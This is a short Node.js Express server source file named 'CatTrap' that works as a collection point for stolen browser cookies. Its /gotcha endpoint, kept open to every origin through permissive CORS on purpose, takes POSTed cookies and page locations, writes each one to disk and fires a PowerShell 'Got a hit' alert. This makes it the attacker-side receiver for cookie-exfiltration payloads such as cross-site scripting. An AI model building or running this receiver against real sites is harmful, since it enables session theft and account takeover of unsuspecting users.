const express = require('express');
const crypto = require('crypto');
const fs = require('fs');
const uuid = require('uuid');
const path = require('path');
var cors = require('cors')
const child_process = require('child_process');
const app = express();
const port = 8666;

app.use(express.static('public'))
app.use(express.urlencoded({ extended: false }));
app.use(express.json())
app.use(cors()) // this IS the point. Accept all POSTs

app.get('/', (req, res) => {
  res.send("Nothing to see here")
})

app.post('/gotcha', (req, res) => {
  console.log("Got something");
  const where = req.body.where;
  const cookies = req.body.cookies;
  res.send("Thanks");
  const filename = path.resolve("./got/" + uuid.v4());
  fs.writeFile(filename, JSON.stringify(req.body), (err) => {
    if (err) {
      console.error(err);
    }
  });
  child_process.execFile("powershell.exe", ["./yo-jess.ps1",
    "-Message",
    "'Find results in: " + filename + "'",
    "-Title", "'Got a hit'"], (err, stdout, stderr) => {
      console.error(stderr);
    });
});

app.listen(port, () => console.log(`CatTrap listening on port ${port}!`))